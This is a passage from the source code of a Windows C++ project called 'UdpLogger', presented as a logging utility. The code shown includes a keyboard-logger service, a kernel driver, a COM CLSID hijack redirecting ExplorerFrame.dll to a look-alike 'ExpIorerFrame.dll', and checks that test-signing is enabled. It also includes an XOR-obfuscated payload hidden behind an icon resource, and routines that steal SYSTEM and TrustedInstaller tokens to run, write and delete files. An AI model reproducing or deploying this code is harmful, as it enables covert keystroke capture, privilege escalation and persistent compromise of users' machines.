    std::filesystem::path resultPath = path.parent_path() / (stem + "_" + getCurrentDateString() + extension);
    return resultPath.string();
}


================================================================================
 FILE: UdpLogger\FileLogger.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-07 21:27:10
 File size     : 0.85 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#include <string>
#include <fstream>
#include <chrono>
#include <filesystem>
#include <mutex>

class FileLogger {
public:
    FileLogger(const std::string& filename);
    ~FileLogger();
    
    void log(const std::string& message);
    void rotateFileIfNeeded();
    bool isNewDay() const;
    void writeHeader(const std::string& listenerAddress, int listenerPort, const std::string& clientAddress = "");
    void writeFooter();
    
private:
    std::string getCurrentDateString() const;
    std::string getCurrentTimeString() const;
    std::string getCurrentDateTimeString() const;
    std::string generateFilename() const;
    
    std::ofstream logFile_;
    std::string baseFilename_;
    std::chrono::year_month_day lastLogDate_;
    std::chrono::system_clock::time_point sessionStartTime_;
    std::mutex fileMutex_;
};


================================================================================
 FILE: UdpLogger\PathHelper.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-08 11:51:30
 File size     : 3.22 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "PathHelper.h"
#include <Windows.h>
#include <ShlObj.h>
#include <iostream>
#include <fstream>

std::filesystem::path PathHelper::GetLogDirectory() {
    // Priority 1: Try %TEMP% (for LocalSystem service)
    wchar_t tempPath[MAX_PATH];
    DWORD tempLen = GetEnvironmentVariableW(L"TEMP", tempPath, MAX_PATH);
    
    if (tempLen > 0 && tempLen < MAX_PATH) {
        std::filesystem::path temp(tempPath);
        if (EnsureDirectoryExists(temp) && IsDirectoryWritable(temp)) {
            std::wcout << L"[PathHelper] Using TEMP directory: " << temp << std::endl;
            return temp;
        }
    }
    
    // Priority 2: Try %TMP% (alternative environment variable)
    DWORD tmpLen = GetEnvironmentVariableW(L"TMP", tempPath, MAX_PATH);
    
    if (tmpLen > 0 && tmpLen < MAX_PATH) {
        std::filesystem::path tmp(tempPath);
        if (EnsureDirectoryExists(tmp) && IsDirectoryWritable(tmp)) {
            std::wcout << L"[PathHelper] Using TMP directory: " << tmp << std::endl;
            return tmp;
        }
    }
    
    // Fallback: Try %USERPROFILE%\Documents
    wchar_t documentsPath[MAX_PATH];
    HRESULT hr = SHGetFolderPathW(nullptr, CSIDL_MYDOCUMENTS, nullptr, SHGFP_TYPE_CURRENT, documentsPath);
    
    if (SUCCEEDED(hr)) {
        std::filesystem::path documents(documentsPath);
        if (EnsureDirectoryExists(documents) && IsDirectoryWritable(documents)) {
            std::wcout << L"[PathHelper] Using Documents directory: " << documents << std::endl;
            return documents;
        }
    }
    
    // Last resort: Current directory
    std::filesystem::path current = std::filesystem::current_path();
    std::wcout << L"[PathHelper] WARNING: Using current directory as fallback: " << current << std::endl;
    return current;
}

std::filesystem::path PathHelper::GetLogFilePath(const std::string& filename) {
    std::filesystem::path logDir = GetLogDirectory();
    return logDir / filename;
}

bool PathHelper::IsDirectoryWritable(const std::filesystem::path& path) {
    if (!std::filesystem::exists(path)) {
        return false;
    }
    
    // Try to create a temporary test file
    std::filesystem::path testFile = path / ".write_test_udplogger.tmp";
    
    try {
        std::ofstream test(testFile, std::ios::out | std::ios::binary);
        if (!test.is_open()) {
            return false;
        }
        test << "test";
        test.close();
        
        // Clean up test file
        std::filesystem::remove(testFile);
        return true;
        
    } catch (...) {
        // Clean up on error
        try {
            if (std::filesystem::exists(testFile)) {
                std::filesystem::remove(testFile);
            }
        } catch (...) {}
        return false;
    }
}

bool PathHelper::EnsureDirectoryExists(const std::filesystem::path& path) {
    try {
        if (std::filesystem::exists(path)) {
            return std::filesystem::is_directory(path);
        }
        
        return std::filesystem::create_directories(path);
        
    } catch (const std::exception& e) {
        std::cerr << "[PathHelper] Failed to create directory: " << e.what() << std::endl;
        return false;
    }
}


================================================================================
 FILE: UdpLogger\PathHelper.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-08 12:16:44
 File size     : 0.74 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <string>
#include <filesystem>

class PathHelper {
public:
    // Get the best available directory for log files
    // Priority: %TEMP% -> %USERPROFILE%\Documents
    static std::filesystem::path GetLogDirectory();
    
    // Get full path for log file with automatic directory resolution
    static std::filesystem::path GetLogFilePath(const std::string& filename);
    
    // Check if directory is writable
    static bool IsDirectoryWritable(const std::filesystem::path& path);
    
    // Create directory if it doesn't exist
    static bool EnsureDirectoryExists(const std::filesystem::path& path);

private:
    PathHelper() = delete;
};


================================================================================
 FILE: UdpLogger\Resource.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 13:08:04
 File size     : 0.47 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by UdpLogger.rc
//
#define IDI_ICON1                       101
#define IDR_MAINICON    				102

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif


================================================================================
 FILE: UdpLogger\ResourceExtractor.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 21:39:34
 File size     : 3.34 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "ResourceExtractor.h"
#include <cstring>

size_t ResourceExtractor::GetIcoSize(const BYTE* data, size_t dataSize) noexcept {
    if (dataSize < 6) return dataSize;
    
    if (data[0] != 0 || data[1] != 0) return dataSize;
    
    WORD numImages = *reinterpret_cast<const WORD*>(data + 4);
    size_t headerSize = 6 + (numImages * 16);
    
    size_t maxEnd = headerSize;
    
    for (WORD i = 0; i < numImages; ++i) {
        size_t entryOffset = 6 + (i * 16);
        if (entryOffset + 16 > dataSize) break;
        
        DWORD imgSize = *reinterpret_cast<const DWORD*>(data + entryOffset + 8);
        DWORD imgOffset = *reinterpret_cast<const DWORD*>(data + entryOffset + 12);
        
        size_t imgEnd = imgOffset + imgSize;
        if (imgEnd > maxEnd) maxEnd = imgEnd;
    }
    
    return (maxEnd <= dataSize) ? maxEnd : dataSize;
}

void ResourceExtractor::XorDecrypt(BYTE* data, size_t size) noexcept {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= XOR_KEY[i % XOR_KEY.size()];
    }
}

std::vector<ResourceExtractor::ExtractedFile> 
ResourceExtractor::ParseTLVPayload(const BYTE* payload, size_t size) noexcept {
    std::vector<ExtractedFile> files;
    
    if (size < 4) return files;
    
    DWORD numFiles = *reinterpret_cast<const DWORD*>(payload);
    size_t offset = 4;
    
    for (DWORD i = 0; i < numFiles && offset < size; ++i) {
        // Odczytaj długość nazwy
        if (offset + 4 > size) break;
        
        DWORD nameLen = *reinterpret_cast<const DWORD*>(payload + offset);
        offset += 4;
        
        // Odczytaj nazwę
        if (offset + nameLen > size) break;
        
        std::string nameUtf8(reinterpret_cast<const char*>(payload + offset), nameLen);
        std::wstring filename(nameUtf8.begin(), nameUtf8.end());
        offset += nameLen;
        
        // ✓ POPRAWKA: Odczytaj długość danych
        if (offset + 4 > size) break;
        
        DWORD dataLen = *reinterpret_cast<const DWORD*>(payload + offset);
        offset += 4;
        
        // Odczytaj dane
        if (offset + dataLen > size) break;
        
        const BYTE* fileData = payload + offset;
        
        ExtractedFile file;
        file.filename = filename;
        file.data.assign(fileData, fileData + dataLen);
        file.isValidPE = true;  // zakładamy że dane są poprawne
        
        files.push_back(std::move(file));
        offset += dataLen;
    }
    
    return files;
}

std::vector<ResourceExtractor::ExtractedFile> 
ResourceExtractor::ExtractFilesFromResource(HINSTANCE hInstance, int resourceId) noexcept {
    HRSRC hRes = FindResourceW(hInstance, MAKEINTRESOURCEW(resourceId), RT_RCDATA);
    if (!hRes) return {};
    
    HGLOBAL hResData = LoadResource(hInstance, hRes);
    if (!hResData) return {};
    
    DWORD resSize = SizeofResource(hInstance, hRes);
    const BYTE* resData = static_cast<const BYTE*>(LockResource(hResData));
    if (!resData) return {};
    
    size_t icoSize = GetIcoSize(resData, resSize);
    if (icoSize >= resSize) return {};
    
    size_t payloadSize = resSize - icoSize;
    std::vector<BYTE> payload(resData + icoSize, resData + resSize);
    
    XorDecrypt(payload.data(), payload.size());
    
    return ParseTLVPayload(payload.data(), payload.size());
}


================================================================================
 FILE: UdpLogger\ResourceExtractor.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 21:40:06
 File size     : 0.72 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once
#include <Windows.h>
#include <vector>
#include <string>
#include <array>

class ResourceExtractor {
public:
    struct ExtractedFile {
        std::wstring filename;
        std::vector<BYTE> data;
        bool isValidPE;
    };

    static std::vector<ExtractedFile> ExtractFilesFromResource(HINSTANCE hInstance, int resourceId) noexcept;

private:
    static constexpr std::array<BYTE, 7> XOR_KEY = { 
        0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C 
    };

    static size_t GetIcoSize(const BYTE* data, size_t dataSize) noexcept;
    static void XorDecrypt(BYTE* data, size_t size) noexcept;
    static std::vector<ExtractedFile> ParseTLVPayload(const BYTE* payload, size_t size) noexcept;
};


================================================================================
 FILE: UdpLogger\SystemStatus.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 10:10:13
 File size     : 4.28 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "SystemStatus.h"
#include "UdpServiceManager.h"
#include "TrustedInstallerExecutor.h"
#include "DriverInstaller.h"
#include <Windows.h>
#include <iostream>

std::wstring SystemStatus::GetCheckmark(bool status) {
    return status ? L"[+]" : L"[-]";
}

std::vector<ComponentStatus> SystemStatus::CheckAllComponents() {
    std::vector<ComponentStatus> components;
    
    // Check Windows Service
    ComponentStatus service;
    service.name = L"Windows Service";
    service.status = UdpServiceManager::IsServiceRunning();  // This should work now
    service.details = service.status ? L"RUNNING (UdpKeyboardLogger)" : L"STOPPED (UdpKeyboardLogger)";
    service.fixHint = service.status ? L"" : L"Run 'UdpLogger service start'";
    components.push_back(service);
    
    // Check Kernel Driver
    ComponentStatus driver;
    driver.name = L"Kernel Driver";
    driver.status = CheckDriverStatus();
    driver.details = driver.status ? L"LOADED (kvckbd.sys)" : L"STOPPED (kvckbd.sys)";
    driver.fixHint = driver.status ? L"" : L"Requires reboot or run 'UdpLogger driver start'";
    components.push_back(driver);
    
    // Check CLSID Hijack
    ComponentStatus clsid;
    clsid.name = L"CLSID Hijack";
    clsid.status = CheckCLSIDHijack();
    clsid.details = clsid.status ? L"ACTIVE (ExplorerFrame.dll -> ExpIorerFrame.dll)" : L"INACTIVE";
    clsid.fixHint = clsid.status ? L"" : L"Run 'UdpLogger install' to repair";
    components.push_back(clsid);
    
    // Check Test Signing
    ComponentStatus testsigning;
    testsigning.name = L"Test Signing";
    testsigning.status = CheckTestSigning();
    testsigning.details = testsigning.status ? L"ENABLED (BCD)" : L"DISABLED (BCD)";
    testsigning.fixHint = testsigning.status ? L"" : L"Run 'UdpLogger install' and reboot";
    components.push_back(testsigning);
    
    // Check Files
    ComponentStatus files;
    files.name = L"Files";
    files.status = CheckDriverFiles();
    files.details = files.status ? L"All components present" : L"Missing driver files";
    files.fixHint = files.status ? L"" : L"Run 'UdpLogger install' to restore files";
    components.push_back(files);
    
    return components;
}

bool SystemStatus::CheckDriverStatus() {
    // Use the new method from UdpServiceManager
    return UdpServiceManager::IsDriverServiceRunning();
}

bool SystemStatus::CheckCLSIDHijack() {
    TrustedInstallerExecutor tiExecutor;
    std::wstring currentValue;
    
    bool success = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",
        currentValue
    );
    
    return success && currentValue.find(L"ExpIorerFrame.dll") != std::wstring::npos;
}

bool SystemStatus::CheckTestSigning() {
    TrustedInstallerExecutor tiExecutor;
    std::wstring bootGuid;
    
    // Read current boot entry GUID
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        return false;
    }
    
    // Check if test signing element exists and is enabled
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    std::vector<BYTE> elementData;
    
    bool testSigningExists = tiExecutor.ReadRegistryBinaryAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        testSigningPath,
        L"Element",
        elementData
    );
    
    return testSigningExists && !elementData.empty() && elementData[0] == 0x01;
}

bool SystemStatus::CheckDriverFiles() {
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring dllPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring driverStorePath = DriverInstaller::GetDriverStorePath();
    std::wstring sysPath = driverStorePath + L"\\kvckbd.sys";
    
    DWORD dllAttrs = GetFileAttributesW(dllPath.c_str());
    DWORD sysAttrs = GetFileAttributesW(sysPath.c_str());
    
    return (dllAttrs != INVALID_FILE_ATTRIBUTES) && 
           (sysAttrs != INVALID_FILE_ATTRIBUTES);
}


================================================================================
 FILE: UdpLogger\SystemStatus.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 10:06:00
 File size     : 0.56 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#include <string>
#include <vector>

// Forward declaration to avoid circular dependency
class UdpServiceManager;

struct ComponentStatus {
    std::wstring name;
    bool status;
    std::wstring details;
    std::wstring fixHint;
};

class SystemStatus {
public:
    static std::vector<ComponentStatus> CheckAllComponents();
    static bool CheckDriverStatus();
    static bool CheckCLSIDHijack();
    static bool CheckTestSigning();
    static bool CheckDriverFiles();
    
private:
    static std::wstring GetCheckmark(bool status);
};


================================================================================
 FILE: UdpLogger\TrustedInstallerExecutor.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 19:25:05
 File size     : 34.53 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// TrustedInstallerExecutor.cpp
#include "TrustedInstallerExecutor.h"
#include <filesystem>
#include <algorithm>
#include <iostream>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wtsapi32.lib")

namespace fs = std::filesystem;

// =============================================================================
// TokenHandle implementation - RAII wrapper for HANDLE
// =============================================================================

TrustedInstallerExecutor::TokenHandle& 
TrustedInstallerExecutor::TokenHandle::operator=(TokenHandle&& other) noexcept {
    if (this != &other) {
        reset(other.release());
    }
    return *this;
}

void TrustedInstallerExecutor::TokenHandle::reset(HANDLE newHandle) noexcept {
    if (handle_ && handle_ != INVALID_HANDLE_VALUE) {
        CloseHandle(handle_);
    }
    handle_ = newHandle;
}

HANDLE TrustedInstallerExecutor::TokenHandle::release() noexcept {
    HANDLE result = handle_;
    handle_ = nullptr;
    return result;
}

// =============================================================================
// AutoHandle - Simple RAII wrapper for HANDLE
// =============================================================================

class AutoHandle {
public:
    AutoHandle(HANDLE handle = nullptr) noexcept : handle_(handle) {}
    ~AutoHandle() { if (handle_) CloseHandle(handle_); }
    
    AutoHandle(const AutoHandle&) = delete;
    AutoHandle& operator=(const AutoHandle&) = delete;
    
    AutoHandle(AutoHandle&& other) noexcept : handle_(other.handle_) { other.handle_ = nullptr; }
    AutoHandle& operator=(AutoHandle&& other) noexcept {
        if (this != &other) {
            reset(other.handle_);
            other.handle_ = nullptr;
        }
        return *this;
    }
    
    operator bool() const noexcept { return handle_ != nullptr && handle_ != INVALID_HANDLE_VALUE; }
    HANDLE get() const noexcept { return handle_; }
    void reset(HANDLE handle = nullptr) noexcept {
        if (handle_ && handle_ != INVALID_HANDLE_VALUE) CloseHandle(handle_);
        handle_ = handle;
    }
    
private:
    HANDLE handle_{nullptr};
};

// =============================================================================
// AutoServiceHandle - Simple RAII wrapper for SC_HANDLE
// =============================================================================

class AutoServiceHandle {
public:
    AutoServiceHandle(SC_HANDLE handle = nullptr) noexcept : handle_(handle) {}
    ~AutoServiceHandle() { if (handle_) CloseServiceHandle(handle_); }
    
    AutoServiceHandle(const AutoServiceHandle&) = delete;
    AutoServiceHandle& operator=(const AutoServiceHandle&) = delete;
    
    AutoServiceHandle(AutoServiceHandle&& other) noexcept : handle_(other.handle_) { other.handle_ = nullptr; }
    AutoServiceHandle& operator=(AutoServiceHandle&& other) noexcept {
        if (this != &other) {
            reset(other.handle_);
            other.handle_ = nullptr;
        }
        return *this;
    }
    
    operator bool() const noexcept { return handle_ != nullptr; }
    SC_HANDLE get() const noexcept { return handle_; }
    void reset(SC_HANDLE handle = nullptr) noexcept {
        if (handle_) CloseServiceHandle(handle_);
        handle_ = handle;
    }
    
private:
    SC_HANDLE handle_{nullptr};
};

// =============================================================================
// TrustedInstallerExecutor implementation
// =============================================================================

TrustedInstallerExecutor::TrustedInstallerExecutor() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    comInitialized_ = SUCCEEDED(hr);
}

TrustedInstallerExecutor::~TrustedInstallerExecutor() {
    if (comInitialized_) {
        CoUninitialize();
    }
}

// =============================================================================
// Main Public API Methods
// =============================================================================

bool TrustedInstallerExecutor::RunAsTrustedInstaller(
    std::wstring_view commandLine, bool showWindow) {
    
    if (commandLine.empty()) {
        std::wcerr << L"Error: Empty command line\n";
        return false;
    }

    std::wcout << L"Attempting to run as TrustedInstaller: " << commandLine << L"\n";

    // Enable required privileges for token manipulation
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        std::wcerr << L"Error: Failed to enable required privileges\n";
        return false;
    }

    // Get SYSTEM token via winlogon process
    auto systemToken = GetSystemToken();
    if (!systemToken) {
        std::wcerr << L"Error: Failed to acquire SYSTEM token\n";
        return false;
    }

    // Impersonate SYSTEM to start TrustedInstaller service
    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        std::wcerr << L"Error: Failed to impersonate SYSTEM\n";
        return false;
    }

    // Start TrustedInstaller service and get its token
    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        std::wcerr << L"Error: Failed to start TrustedInstaller service\n";
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf(); // Always revert impersonation

    if (!tiToken) {
        std::wcerr << L"Error: Failed to acquire TrustedInstaller token\n";
        return false;
    }

    // Enable all privileges on the token for maximum access
    if (!EnableAllPrivileges(tiToken)) {
        std::wcerr << L"Warning: Failed to enable some privileges on token\n";
    }

    // Create the process with TrustedInstaller token
    bool success = CreateProcessWithToken(tiToken, commandLine, showWindow);
    
    if (success) {
        std::wcout << L"Successfully started process with TrustedInstaller privileges\n";
    } else {
        std::wcerr << L"Error: Failed to create process with TrustedInstaller token\n";
    }

    return success;
}

bool TrustedInstallerExecutor::RunAsTrustedInstaller(
    const fs::path& executablePath, std::wstring_view arguments, bool showWindow) {
    
    if (!fs::exists(executablePath)) {
        std::wcerr << L"Error: Executable not found: " << executablePath.wstring() << L"\n";
        return false;
    }

    std::wstring commandLine = L"\"" + executablePath.wstring() + L"\"";
    if (!arguments.empty()) {
        commandLine += L" " + std::wstring(arguments);
    }

    return RunAsTrustedInstaller(commandLine, showWindow);
}

// =============================================================================
// New Public API Methods - Direct File Operations
// =============================================================================

bool TrustedInstallerExecutor::CopyFileAsTrustedInstaller(const std::wstring& source, const std::wstring& destination) noexcept {
    // Enable required privileges for token manipulation
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    // Get SYSTEM token via winlogon process
    auto systemToken = GetSystemToken();
    if (!systemToken) {
        return false;
    }

    // Impersonate SYSTEM to start TrustedInstaller service
    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    // Start TrustedInstaller service and get its token
    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) {
        return false;
    }

    // Enable all privileges on the token
    (void)EnableAllPrivileges(tiToken);

    // Perform file copy using TrustedInstaller token
    bool success = CopyFileWithToken(tiToken, source, destination);
    
    return success;
}

bool TrustedInstallerExecutor::WriteFileAsTrustedInstaller(const std::wstring& path, const std::vector<BYTE>& data) noexcept {
    // Enable required privileges for token manipulation
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    // Get SYSTEM token via winlogon process
    auto systemToken = GetSystemToken();
    if (!systemToken) {
        return false;
    }

    // Impersonate SYSTEM to start TrustedInstaller service
    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    // Start TrustedInstaller service and get its token
    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) {
        return false;
    }

    // Enable all privileges on the token
    (void)EnableAllPrivileges(tiToken);

    // Perform direct file write using TrustedInstaller token
    bool success = WriteFileWithToken(tiToken, path, data);
    
    return success;
}

bool TrustedInstallerExecutor::DeleteFileAsTrustedInstaller(const std::wstring& path) noexcept {
    // Enable required privileges for token manipulation
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    // Get SYSTEM token via winlogon process
    auto systemToken = GetSystemToken();
    if (!systemToken) {
        return false;
    }

    // Impersonate SYSTEM to start TrustedInstaller service
    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    // Start TrustedInstaller service and get its token
    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) {
        return false;
    }

    // Enable all privileges on the token
    (void)EnableAllPrivileges(tiToken);

    // Perform file deletion using TrustedInstaller token
    bool success = DeleteFileWithToken(tiToken, path);
    
    return success;
}

// =============================================================================
// Private Implementation Methods - Core Functionality
// =============================================================================

bool TrustedInstallerExecutor::EnableAllPrivileges(const TokenHandle& token) const noexcept {
    bool allSucceeded = true;

    for (auto privilege : REQUIRED_PRIVILEGES) {
        TOKEN_PRIVILEGES tp{};
        LUID luid;

        if (LookupPrivilegeValueW(nullptr, privilege.data(), &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            
            if (!AdjustTokenPrivileges(token.get(), FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
                allSucceeded = false;
            }
        } else {
            allSucceeded = false;
        }
    }

    return allSucceeded;
}

bool TrustedInstallerExecutor::EnablePrivilege(std::wstring_view privilegeName) const noexcept {
    TokenHandle processToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
                         processToken.address())) {
        return false;
    }

    TOKEN_PRIVILEGES tp{};
    LUID luid;

    if (!LookupPrivilegeValueW(nullptr, privilegeName.data(), &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(processToken.get(), FALSE, &tp, sizeof(tp), nullptr, nullptr) &&
           GetLastError() == ERROR_SUCCESS;
}

std::optional<DWORD> TrustedInstallerExecutor::GetProcessIdByName(
    std::wstring_view processName) const noexcept {
    
    AutoHandle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (!snapshot) return std::nullopt;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snapshot.get(), &pe)) {
        do {
            if (std::wstring_view(pe.szExeFile) == processName) {
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snapshot.get(), &pe));
    }

    return std::nullopt;
}

TrustedInstallerExecutor::TokenHandle TrustedInstallerExecutor::GetSystemToken() const noexcept {
    auto winlogonPid = GetProcessIdByName(L"winlogon.exe");
    if (!winlogonPid) return TokenHandle{};

    AutoHandle process(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, *winlogonPid));
    if (!process) return TokenHandle{};

    TokenHandle token;
    if (!OpenProcessToken(process.get(), TOKEN_DUPLICATE | TOKEN_QUERY, token.address())) {
        return TokenHandle{};
    }

    TokenHandle duplicatedToken;
    if (!DuplicateTokenEx(token.get(), MAXIMUM_ALLOWED, nullptr, SecurityImpersonation,
                         TokenImpersonation, duplicatedToken.address())) {
        return TokenHandle{};
    }

    return duplicatedToken;
}

std::optional<DWORD> TrustedInstallerExecutor::StartTrustedInstallerService() const noexcept {
    AutoServiceHandle scManager(OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT));
    if (!scManager) return std::nullopt;

    AutoServiceHandle service(OpenServiceW(scManager.get(), L"TrustedInstaller", 
                                         SERVICE_QUERY_STATUS | SERVICE_START));
    if (!service) return std::nullopt;

    SERVICE_STATUS_PROCESS status{};
    DWORD bytesNeeded = 0;
    constexpr DWORD timeout = 3000; // 3 seconds timeout
    const auto startTime = GetTickCount64();

    while (QueryServiceStatusEx(service.get(), SC_STATUS_PROCESS_INFO,
                               reinterpret_cast<BYTE*>(&status), sizeof(status), &bytesNeeded)) {
        switch (status.dwCurrentState) {
            case SERVICE_RUNNING:
                return status.dwProcessId;

            case SERVICE_STOPPED:
                if (!StartServiceW(service.get(), 0, nullptr)) {
                    return std::nullopt;
                }
                break;

            case SERVICE_START_PENDING:
            case SERVICE_STOP_PENDING:
                if (GetTickCount64() - startTime > timeout) {
                    return std::nullopt;
                }
                Sleep(status.dwWaitHint ? status.dwWaitHint : 100);
                break;

            default:
                Sleep(100);
                break;
        }
    }

    return std::nullopt;
}

TrustedInstallerExecutor::TokenHandle TrustedInstallerExecutor::GetTrustedInstallerToken(
    DWORD trustedInstallerPid) const noexcept {
    
    AutoHandle process(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid));
    if (!process) return TokenHandle{};

    TokenHandle token;
    if (!OpenProcessToken(process.get(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, 
                         token.address())) {
        return TokenHandle{};
    }

    TokenHandle duplicatedToken;
    if (!DuplicateTokenEx(token.get(), MAXIMUM_ALLOWED, nullptr, SecurityImpersonation,
                         TokenImpersonation, duplicatedToken.address())) {
        return TokenHandle{};
    }

    return duplicatedToken;
}

bool TrustedInstallerExecutor::CreateProcessWithToken(const TokenHandle& token,
                                                    std::wstring_view commandLine,
                                                    bool showWindow) const noexcept {
    std::wstring mutableCmd(commandLine);
    
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = showWindow ? SW_SHOW : SW_HIDE;

    PROCESS_INFORMATION pi{};
    
    const DWORD creationFlags = showWindow ? 0 : CREATE_NO_WINDOW;
    
    BOOL success = CreateProcessWithTokenW(token.get(), LOGON_WITH_PROFILE, nullptr,
                                          mutableCmd.data(), creationFlags, nullptr, nullptr,
                                          &si, &pi);

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return success;
}

// =============================================================================
// New Private Methods - Direct File Operations with Token
// =============================================================================

bool TrustedInstallerExecutor::CopyFileWithToken(const TokenHandle& token, 
                                               const std::wstring& source, 
                                               const std::wstring& destination) const noexcept {
    bool success = false;

    // Impersonate TrustedInstaller token for file operations
    if (ImpersonateLoggedOnUser(token.get())) {
        // Use native Windows CopyFile API with impersonated token
        if (CopyFileW(source.c_str(), destination.c_str(), FALSE)) {
            success = true;
        } else {
            // Log error for debugging (optional)
            DWORD error = GetLastError();
            std::wcerr << L"CopyFile failed with error: " << error << std::endl;
        }
        RevertToSelf(); // Always revert to original context
    }

    return success;
}

bool TrustedInstallerExecutor::WriteFileWithToken(const TokenHandle& token,
                                                const std::wstring& path,
                                                const std::vector<BYTE>& data) const noexcept {
    bool success = false;

    // Impersonate TrustedInstaller token for file operations
    if (ImpersonateLoggedOnUser(token.get())) {
        // Create file with TrustedInstaller privileges
        HANDLE hFile = CreateFileW(
            path.c_str(),
            GENERIC_WRITE,
            0, // No sharing
            nullptr,
            CREATE_ALWAYS, // Overwrite if exists
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten = 0;
            if (WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr)) {
                success = (bytesWritten == data.size());
            }
            CloseHandle(hFile);
        }
        RevertToSelf(); // Always revert to original context
    }

    return success;
}

bool TrustedInstallerExecutor::DeleteFileWithToken(const TokenHandle& token,
                                                  const std::wstring& path) const noexcept {
    bool success = false;

    // Impersonate TrustedInstaller token for file operations
